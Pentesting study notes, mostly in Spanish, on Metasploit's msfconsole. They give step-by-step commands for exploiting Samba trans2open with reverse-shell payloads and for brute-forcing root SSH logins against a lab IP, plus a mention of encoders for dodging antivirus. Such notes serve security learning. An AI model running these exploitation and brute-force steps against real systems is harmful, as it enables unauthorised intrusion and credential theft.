# Metasploit ❮❯

Sintax: 
	RHOSTS = Remote Host (The target IP)
	LHOST = Local host (Our IP)

- **msfconsole -q** Iniciamos metasploit (q=no cargue el banner)
**❯ search ❮exploit❯** Buscamos el exploit
		* Modulos: 'Auxiliary, Exploits, Post, Payload'
		* Tipo de Accion: 'Dos, Fuzzers, Scanner, Gather'
**❯ use ❮Number or path❯** Colocamos el numero del exploit que vamos a usar
**❯ options** Miramos las opciones del exploit y lo que debemos de configurar
**❯ set LHOST IP_addres** Configuramos el IP local (Si estamos en una VPN colocar el Tun0)
**❯ set RHOSTS IP_addres** Configuramos el IP remoto (maquina victima)
**❯ set RPORT** **#Puerto** Configuramos el puerto remoto (maquina victima)
**❯ set LPORT** **#Puerto** Configuramos el puerto local
**❯ show targets** Miras los targets disponibles (Diferentes versiones de Windows)
**❯ set target** **numero** Seleccionamos el numero de target a usar
**❯ show payloads** Miramos los payload disponibles


**Payloads**
Non-Stage -> Sends exploit shellcode all at once. Larger in size ando won't always work -> **windows/meterpreter_reverse_tcp**
Staged -> Sends payload in stages. Can be less stable -> **windows/meterpreter/reverse_tcp**

En este caso utilizaremos Metasploit para poder entrar por Samba 2.2
❯ **msfconsole** 
	❯ **search trans2open**
	❯ **use 1**
	❯ **options**
	❯ **set RHOST 192.168.68.112**
	❯ **run o exploit**
Miramos en options que esta ejecutado un **staged payload** ya que tenemos un **linux/x86/meterpreter/reverse_tcp**
Si no funciona podriamos hacer lo siguiente y buscaremos un **Non-staged payload**
❯ **set payload linux/x86/** Antes de completar el payload, podemos darle doble TAB para ver las opciones y los demas Payloads
❯ **set payload linux/x86/shell_reverse_tcp** 
❯ **options** 
❯ **run** Ejecutamos  


Tambien podemos usar Metasploit para explotar el SSH
❯ **msfconsole** 
	❯ **search ssh**
	❯ **use 17** Usaremos el que dice SSH_login
	❯ **options**
	❯ **set username root** Colocaremos el usuario de root
	❯ **set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt** Colocamos la ruta del diccionario 
	❯ **set rhosts 192.168.68.112** Colocamos la IP del target
	❯ **set threads 10** Para que vaya mas rapido al momento de mandar las solicitudes
	❯ **run** Ejecutamos el exploit


- **msfconsole** Para iniciar metaesploit para escanear **SMB**
	❯ **search smb** En este caso buscaremos exploits de SMB, podemos encontrar:
		* Modulos: 'Auxiliary, Exploits, Post, Payload'
		* Tipo de Accion: 'Dos, Fuzzers, Scanner, Gather'
	❯ **use <module#>** Para usar el modulo, lo podremos hacer con la ruta o con el numero 
	❯ **info** Mirar la informacion del modulo
	❯ **options** Para ver las opciones del modulo y ver que necesitamos colocar para que funcione correctamente
	❯ **set RHOSTS <IP.Address>** Colocamos la IP target en el modulo
	❯ **run** Para ejecutar el exploit

Lista de exploits:
-   **samba 3.0.20** Para smb de los puertos 445/139

**❯ shell** Dentro del exploit con shell nos podemos conseguir una consola interactiva




----
# Metasploit Msfconsole ❮❯

The main components of the Metasploit Framework can be summarized as follows;
-   **msfconsole**: The main command-line interface.
-   **Modules**: supporting modules such as exploits, scanners, payloads, etc.
-   **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.

-   **Exploit:** A piece of code that uses a vulnerability present on the target system.
-   **Vulnerability:** A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
-   **Payload:** An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.

- **Encoders**: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
- **Evasion**: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.



Comandos Metasploit, Soporta comandos Linux, no puede redireccionar el output de un comando, ademas puedes completar comandos con TAB
- Comando -> **msfconsole -q** Inicias el servicio de msfconsole (q=ignoras el banner del inicio)
	**>help** Menu de ayuda de metasploit
	**>clear** Limpiamos la pantalla
	**>ls** Listamos el contenido en donde ejecutamos metasploit
	**>ping -c 1 < IP>** Podemos hacer ping a una IP determinada (c=numero de ping a realizar)
	**>history** Muestra el historial de comandos
	
	 	
